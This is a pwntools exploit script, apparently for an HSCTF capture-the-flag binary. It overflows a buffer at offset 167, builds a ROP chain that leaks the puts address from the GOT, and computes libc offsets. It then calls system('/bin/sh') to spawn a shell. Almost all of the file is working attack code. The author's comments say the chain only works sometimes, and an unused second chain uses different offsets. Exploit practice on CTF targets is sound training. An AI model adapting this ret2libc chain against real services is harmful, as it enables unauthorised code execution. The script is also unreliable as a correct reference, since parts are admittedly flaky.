#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ex'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host = 'ex.hsctf.com'
port = 1337

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

# Got manually through cyclic gdb-pwndbg
offset = 167

# calls puts
io.sendline(b'l')

# crafting ROP chains to leak libc here
rop = ROP(exe)
rop.rdi = elf.got['puts']
rop.raw(elf.plt['puts'])
rop.ret.address
rop.raw(elf.sym['main'])

payload = flat({
    offset: [
        rop.chain()
    ]
})

# sending payload
io.sendline(payload)
io.sendlineafter(b'?', b'Q')

# receive unnecessary lines
for i in range(3):
    io.recvline()

# libc.blukat.me founds libc6_2.31-0ubuntu9.9_amd64 
leaked_got_puts = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
info('puts address: %#x', leaked_got_puts)
libc_base = leaked_got_puts - 0x084420

info('libc base: %#x', libc_base)
info('/bin/sh: %#x', libc_base + 0x1b45bd)
info('system: %#x', libc_base + 0x052290)

# this somehow doest work?
rop = ROP(exe)
rop.rdi = (libc_base + 0x12a628) # /bin/sh
rop.ret.address
rop.raw(libc_base + 0x03f8d0) # system

payload = flat({
    offset: [
        0x04014f3, # ropper pop rdi; ret 
        libc_base + 0x1b45bd, # /bin/sh
        rop.ret.address,
        libc_base + 0x052290 # system
    ]
})

io.sendline(payload)
io.recvline()
io.sendlineafter(b'?', b'Q')

# got shell? run it again if failed, sometimes work, somtimes it doesn't
io.interactive() # flag in is in root path /